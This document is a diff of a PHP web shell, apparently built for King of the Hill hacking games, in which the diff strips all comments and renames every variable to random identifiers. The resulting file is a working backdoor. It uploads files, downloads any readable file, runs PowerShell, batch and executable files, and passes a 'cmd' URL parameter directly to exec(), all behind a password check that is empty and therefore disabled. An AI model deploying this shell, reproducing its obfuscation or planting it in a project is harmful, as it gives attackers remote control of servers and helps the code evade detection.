@@ -5,16 +5,11 @@
 
 
 
-<?php
-    // Password protection, useful for King of The Hill games
-    $pass=''; // Set to null to disable; Set to string to enable, must be the sha512 hash of the password.
-
-        global $cmdresults;
-        global $retval;
-    if($pass != null) {
-        if (isset($_COOKIE['pass'])) { // We use cookies and not url parameter for security reasons
-            // As it is likely that URL parameters are logged by the webserver, thus revealing the password
-            if (hash('sha512', $_COOKIE['pass']) !== $pass) {
+<?php         $we3463500836=''; 
+        global $gh572007645;
+        global $js708420072;
+    if($we3463500836 != null) {
+        if (isset($_COOKIE['pass'])) {                         if (hash('sha512', $_COOKIE['pass']) !== $we3463500836) {
                 echo "Wrong password !";
                 exit;
             }
@@ -24,57 +19,48 @@
         }
     }
 
-    function getAbsolute(string $path): string
+    function getAbsolute(string $ee190089999): string
     {
-        // Cleaning path regarding OS
-        $path = mb_ereg_replace('\\\\|/', '/', $path, 'msr');
-        // Check if path start with a separator (UNIX)
-        $startWithSeparator = $path[0] === '/';
-        // Check if start with drive letter
-        preg_match('/^[a-z]:/', $path, $matches);
-        $startWithLetterDir = isset($matches[0]) ? $matches[0] : false;
-        // Get and filter empty sub paths
-        $subPaths = array_filter(explode('/', $path), 'mb_strlen');
+                $ee190089999 = mb_ereg_replace('\\\\|/', '/', $ee190089999, 'msr');
+                $ep666533230 = $ee190089999[0] === '/';
+                preg_match('/^[a-z]:/', $ee190089999, $fo103159226);
+        $de298497536 = isset($fo103159226[0]) ? $fo103159226[0] : false;
+                $xn818431695 = array_filter(explode('/', $ee190089999), 'mb_strlen');
 
-        $absolutes = [];
-        foreach ($subPaths as $subPath) {
-            if ('.' === $subPath) {
+        $xh2577458364 = [];
+        foreach ($xn818431695 as $nr1926452922) {
+            if ('.' === $nr1926452922) {
                 continue;
             }
-            // if $startWithSeparator is false
-            // and $startWithLetterDir
-            // and (absolutes is empty or all previous values are ..)
-            // save absolute cause that's a relative and we can't deal with that and just forget that we want go up
-            if ('..' === $subPath
-                && !$startWithSeparator
-                && !$startWithLetterDir
-                && empty(array_filter($absolutes, function ($value) { return !('..' === $value); }))
+                                                            if ('..' === $nr1926452922
+                && !$ep666533230
+                && !$de298497536
+                && empty(array_filter($xh2577458364, function ($sx494360628) { return !('..' === $sx494360628); }))
             ) {
-                $absolutes[] = $subPath;
+                $xh2577458364[] = $nr1926452922;
                 continue;
             }
-            if ('..' === $subPath) {
-                array_pop($absolutes);
+            if ('..' === $nr1926452922) {
+                array_pop($xh2577458364);
                 continue;
             }
-            $absolutes[] = $subPath;
+            $xh2577458364[] = $nr1926452922;
         }
 
         return
-            (($startWithSeparator ? '/' : $startWithLetterDir) ?
-                $startWithLetterDir.'/' : ''
-            ).implode('/', $absolutes);
+            (($ep666533230 ? '/' : $de298497536) ?
+                $de298497536.'/' : ''
+            ).implode('/', $xh2577458364);
     }
 
-    // Upload file to the server
-    if (isset($_POST['upload'])) {
-        $desinationDir = getDir();
-        $destinationFile = $desinationDir.'/'.basename($_FILES['file']['name']);
+        if (isset($_POST['upload'])) {
+        $ho972891117 = getDir();
+        $es2085602742 = $ho972891117.'/'.basename($_FILES['file']['name']);
 
-        if (file_exists($destinationFile)) {
+        if (file_exists($es2085602742)) {
             echo "<script>alert('Error: File already exists !')</script>";
         }
-        else if (move_uploaded_file($_FILES['file']['tmp_name'], $destinationFile)) {
+        else if (move_uploaded_file($_FILES['file']['tmp_name'], $es2085602742)) {
             echo "<script>alert('File uploaded successfuly !')</script>";
         } else {
             echo "<script>alert('Error: Could not upload file !')</script>";
@@ -82,39 +68,38 @@
     
     }
     else if (isset($_GET['runscript'])) {
-        $script = $_GET['runscript'];
-        $scriptPath = getAbsolute($script);
-        $command = 'pwsh -Noni -Nop -File "' . $scriptPath . '"';
-        global $cmdresults;
-        global $retval;
-        $cmdresults = shell_exec($command);
+        $pu478250810 = $_GET['runscript'];
+        $sn3860055220 = getAbsolute($pu478250810);
+        $lh2395663060 = 'pwsh -Noni -Nop -File "' . $sn3860055220 . '"';
+        global $gh572007645;
+        global $js708420072;
+        $gh572007645 = shell_exec($lh2395663060);
     }
     else if (isset($_GET['runexe'])) {
-        $script = $_GET['runexe'];
-        $scriptPath = getAbsolute($script);
-        $command = $scriptPath;
-        exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
+        $pu478250810 = $_GET['runexe'];
+        $sn3860055220 = getAbsolute($pu478250810);
+        $lh2395663060 = $sn3860055220;
+        exec('cd '.realpath(getDir()).' && '.$sn3860055220, $gh572007645, $js708420072);
     }
     else if (isset($_GET['runbat'])) {
-        $script = $_GET['runbat'];
-        $scriptPath = getAbsolute($script);
-        $command = 'pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","' . $scriptPath . ') }';
-        exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
+        $pu478250810 = $_GET['runbat'];
+        $sn3860055220 = getAbsolute($pu478250810);
+        $lh2395663060 = 'pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","' . $sn3860055220 . ') }';
+        exec('cd '.realpath(getDir()).' && '.$sn3860055220, $gh572007645, $js708420072);
     }
     
-    // Download a file from the server
-    if (isset($_GET['download'])) {
-        $file = $_GET['download'];
-        if (file_exists($file)) {
-            if (is_readable($file)) {
+        if (isset($_GET['download'])) {
+        $nj2359244304 = $_GET['download'];
+        if (file_exists($nj2359244304)) {
+            if (is_readable($nj2359244304)) {
                 header('Content-Description: File Transfer');
                 header('Content-Type: application/octet-stream');
-                header('Content-Disposition: attachment; filename="'.basename($file).'"');
+                header('Content-Disposition: attachment; filename="'.basename($nj2359244304).'"');
                 header('Expires: 0');
                 header('Cache-Control: must-revalidate');
                 header('Pragma: public');
-                header('Content-Length: '.filesize($file));
-                readfile($file);
+                header('Content-Length: '.filesize($nj2359244304));
+                readfile($nj2359244304);
                 exit;
             } else {
                 echo "<script>alert('Error: Could not read the file !')</script>";
@@ -156,8 +141,8 @@
     function getButtonsColor(){
         return '#3ADF00';
     }
-    function getBgColor($level){
-        switch ($level) {
+    function getBgColor($ky2599078931){
+        switch ($ky2599078931) {
           case 1:
             return '#101010';
             break;
@@ -175,104 +160,104 @@
         }
         return '#404040';
     }
-    function fileExtension($name) {
-        $n = strrpos($name, '.');
-        return ($n === false) ? '' : substr($name, $n+1);
+    function fileExtension($tw1579384326) {
+        $ie2013832146 = strrpos($tw1579384326, '.');
+        return ($ie2013832146 === false) ? '' : substr($tw1579384326, $ie2013832146+1);
     }
-    function getItemSize($filename) {
-        $retval =  '';
-        $fname = getDir().'/'.$filename;
-        if (is_dir($fname)){  
-            $retval .=  '<td style="color: "' .  getDirectoryColor() . '">';
-            $retval .= htmlspecialchars('<dir>');
+    function getItemSize($ta1007413605) {
+        $js708420072 =  '';
+        $re2939671786 = getDir().'/'.$ta1007413605;
+        if (is_dir($re2939671786)){  
+            $js708420072 .=  '<td style="color: "' .  getDirectoryColor() . '">';
+            $js708420072 .= htmlspecialchars('<dir>');
         }
         else{
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retsize = formatSizeUnits(filesize($fname));
-            $retval .= $retsize;
+            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            $wz1685339628 = formatSizeUnits(filesize($re2939671786));
+            $js708420072 .= $wz1685339628;
         }
-        $retval .= '</td>';
-        return $retval;
+        $js708420072 .= '</td>';
+        return $js708420072;
     }
-    function getItemActions($filename) {
-        $retval =  '';
-        $ext = pathinfo($filename, PATHINFO_EXTENSION);
-        switch ($ext) {
+    function getItemActions($ta1007413605) {
+        $js708420072 =  '';
+        $jc30643714 = pathinfo($ta1007413605, PATHINFO_EXTENSION);
+        switch ($jc30643714) {
           case "ps1":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= makeRunScriptFile($filename);
+            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            $js708420072 .= makeRunScriptFile($ta1007413605);
             break;
           case "bat":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= makeRunBatFile($filename);
+            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            $js708420072 .= makeRunBatFile($ta1007413605);
             break;
           case "exe":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= makeRunExeFile($filename);
+            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            $js708420072 .= makeRunExeFile($ta1007413605);
             break;
           default:
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= htmlspecialchars('noop');
+            $js708420072 .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            $js708420072 .= htmlspecialchars('noop');
         }
-        $retval .= '</td>';
-        return $retval;
+        $js708420072 .= '</td>';
+        return $js708420072;
     }
-    function printPerms($file) {
-        $mode = fileperms($file);
-        if( $mode & 0x1000 ) { $type='p'; }
-        else if( $mode & 0x2000 ) { $type='c'; }
-        else if( $mode & 0x4000 ) { $type='d'; }
-        else if( $mode & 0x6000 ) { $type='b'; }
-        else if( $mode & 0x8000 ) { $type='-'; }
-        else if( $mode & 0xA000 ) { $type='l'; }
-        else if( $mode & 0xC000 ) { $type='s'; }
-        else $type='u';
-        $owner["read"] = ($mode & 00400) ? 'r' : '-';
-        $owner["write"] = ($mode & 00200) ? 'w' : '-';
-        $owner["execute"] = ($mode & 00100) ? 'x' : '-';
-        $group["read"] = ($mode & 00040) ? 'r' : '-';
-        $group["write"] = ($mode & 00020) ? 'w' : '-';
-        $group["execute"] = ($mode & 00010) ? 'x' : '-';
-        $world["read"] = ($mode & 00004) ? 'r' : '-';
-        $world["write"] = ($mode & 00002) ? 'w' : '-';
-        $world["execute"] = ($mode & 00001) ? 'x' : '-';
-        if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
-        if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
-        if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
-        $s=sprintf("%1s", $type);
-        $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
-        $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
-        $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
-        return $s;
+    function printPerms($nj2359244304) {
+        $ab2546616235 = fileperms($nj2359244304);
+        if( $ab2546616235 & 0x1000 ) { $ug2363381545='p'; }
+        else if( $ab2546616235 & 0x2000 ) { $ug2363381545='c'; }
+        else if( $ab2546616235 & 0x4000 ) { $ug2363381545='d'; }
+        else if( $ab2546616235 & 0x6000 ) { $ug2363381545='b'; }
+        else if( $ab2546616235 & 0x8000 ) { $ug2363381545='-'; }
+        else if( $ab2546616235 & 0xA000 ) { $ug2363381545='l'; }
+        else if( $ab2546616235 & 0xC000 ) { $ug2363381545='s'; }
+        else $ug2363381545='u';
+        $zz3479234172["read"] = ($ab2546616235 & 00400) ? 'r' : '-';
+        $zz3479234172["write"] = ($ab2546616235 & 00200) ? 'w' : '-';
+        $zz3479234172["execute"] = ($ab2546616235 & 00100) ? 'x' : '-';
+        $oa1841317061["read"] = ($ab2546616235 & 00040) ? 'r' : '-';
+        $oa1841317061["write"] = ($ab2546616235 & 00020) ? 'w' : '-';
+        $oa1841317061["execute"] = ($ab2546616235 & 00010) ? 'x' : '-';
+        $wn980881731["read"] = ($ab2546616235 & 00004) ? 'r' : '-';
+        $wn980881731["write"] = ($ab2546616235 & 00002) ? 'w' : '-';
+        $wn980881731["execute"] = ($ab2546616235 & 00001) ? 'x' : '-';
+        if( $ab2546616235 & 0x800 ) $zz3479234172["execute"] = ($zz3479234172['execute']=='x') ? 's' : 'S';
+        if( $ab2546616235 & 0x400 ) $oa1841317061["execute"] = ($oa1841317061['execute']=='x') ? 's' : 'S';
+        if( $ab2546616235 & 0x200 ) $wn980881731["execute"] = ($wn980881731['execute']=='x') ? 't' : 'T';
+        $eo453955339=sprintf("%1s", $ug2363381545);
+        $eo453955339.=sprintf("%1s%1s%1s", $zz3479234172['read'], $zz3479234172['write'], $zz3479234172['execute']);
+        $eo453955339.=sprintf("%1s%1s%1s", $oa1841317061['read'], $oa1841317061['write'], $oa1841317061['execute']);
+        $eo453955339.=sprintf("%1s%1s%1s", $wn980881731['read'], $wn980881731['write'], $wn980881731['execute']);
+        return $eo453955339;
     }
 
-    function formatSizeUnits($bytes) {
-        if ($bytes >= 1073741824)
+    function formatSizeUnits($va2979611598) {
+        if ($va2979611598 >= 1073741824)
         {
-            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
+            $va2979611598 = number_format($va2979611598 / 1073741824, 2) . ' GB';
         }
-        elseif ($bytes >= 1048576)
+        elseif ($va2979611598 >= 1048576)
         {
-            $bytes = number_format($bytes / 1048576, 2) . ' MB';
+            $va2979611598 = number_format($va2979611598 / 1048576, 2) . ' MB';
         }
-        elseif ($bytes >= 1024)
+        elseif ($va2979611598 >= 1024)
         {
-            $bytes = number_format($bytes / 1024, 2) . ' KB';
+            $va2979611598 = number_format($va2979611598 / 1024, 2) . ' KB';
         }
-        elseif ($bytes > 1)
+        elseif ($va2979611598 > 1)
         {
-            $bytes = $bytes . ' bytes';
+            $va2979611598 = $va2979611598 . ' bytes';
         }
-        elseif ($bytes == 1)
+        elseif ($va2979611598 == 1)
         {
-            $bytes = $bytes . ' byte';
+            $va2979611598 = $va2979611598 . ' byte';
         }
         else
         {
-            $bytes = '0 bytes';
+            $va2979611598 = '0 bytes';
         }
 
-        return $bytes;
+        return $va2979611598;
     }
 
 
@@ -281,37 +266,34 @@
     }
 
 
-    function makeFileName($file) {
-        if (is_dir(getDir().'/'.$file)) {
-            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
+    function makeFileName($nj2359244304) {
+        if (is_dir(getDir().'/'.$nj2359244304)) {
+            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$nj2359244304).'">'.$nj2359244304.'</a>';
         } else {
-            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
+            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$nj2359244304).'">'.$nj2359244304.'</a>';
         }
     }
-    function makeRunScriptFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+    function makeRunScriptFile($nj2359244304) {
+        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$nj2359244304).'&dir='.realpath(getDir()) . '">'.'run</a>';
     }
-    function makeRunExeFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+    function makeRunExeFile($nj2359244304) {
+        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$nj2359244304).'&dir='.realpath(getDir()) . '">'.'run</a>';
     }
-    function makeRunBatFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+    function makeRunBatFile($nj2359244304) {
+        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$nj2359244304).'&dir='.realpath(getDir()) . '">'.'run</a>';
     }
     function getFiles() {
-        $files = scandir(getDir());
+        $wb104153177 = scandir(getDir());
 
-        $even = true;
-        if ($files != null) {
-            foreach($files as $filename){
-                //Simply print them out onto the screen.
-                echo '<tr style="background-color:'.($even  ? '#515151' : '#212121').';">';
-                echo '<td style="font-weight:thin;">'.makeFileName($filename).'</td>'; 
-                //echo '<td>owner</td>';
-                //echo '<td>'.printPerms(getDir().'/'.$filename).'</td>';
-                echo ''.getItemSize($filename).'';
-                echo ''.getItemActions($filename).'';
+        $pw3477086066 = true;
+        if ($wb104153177 != null) {
+            foreach($wb104153177 as $ta1007413605){
+                                echo '<tr style="background-color:'.($pw3477086066  ? '#515151' : '#212121').';">';
+                echo '<td style="font-weight:thin;">'.makeFileName($ta1007413605).'</td>'; 
+                                                echo ''.getItemSize($ta1007413605).'';
+                echo ''.getItemActions($ta1007413605).'';
                 echo '</tr>';
-                $even = !$even;
+                $pw3477086066 = !$pw3477086066;
             }
         } else {
             echo "<p>Couldn't open that directory !";
@@ -319,37 +301,37 @@
     }
 
     function getCmdResults() {
-        global $cmdresults;
-        global $retval;
+        global $gh572007645;
+        global $js708420072;
         
-        if ($retval == 0 ) {
-            if($cmdresults != null){
-                foreach ($cmdresults as $line) {
+        if ($js708420072 == 0 ) {
+            if($gh572007645 != null){
+                foreach ($gh572007645 as $aj3507795190) {
 
-                    if($line != null){
+                    if($aj3507795190 != null){
                         echo "<br>";
-                        echo htmlspecialchars($line);
+                        echo htmlspecialchars($aj3507795190);
                         echo "\n";
                         
                     }
                 }
             }
         } else {
-            echo "Execution failed with error code: ".$retval;
+            echo "Execution failed with error code: ".$js708420072;
         }    
     }
 
     function getCommandLine() {
-        $hostname = gethostname() ?? 'none';
-        $username = get_current_user();
-        $dir = getDir();
-        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
+        $xd3847340049 = gethostname() ?? 'none';
+        $ep4166911607 = get_current_user();
+        $rt3131800080 = getDir();
+        $tc794565824 = isset($_GET['cmd']) ? $_GET['cmd'] : '';
 
-        return '<span style="color: #ff6347">'.$username.'@'.$hostname.'</span>: <span style="color: #B40404">'.$dir.'</span>$ '.$cmd;
+        return '<span style="color: #ff6347">'.$ep4166911607.'@'.$xd3847340049.'</span>: <span style="color: #B40404">'.$rt3131800080.'</span>$ '.$tc794565824;
     }
 
     if (isset($_GET['cmd'])) {
-        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $cmdresults, $retval);
+        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $gh572007645, $js708420072);
     }
 ?>
 
@@ -734,6 +716,7 @@
         </style>
     </body>
 </html>
+
 
 
 
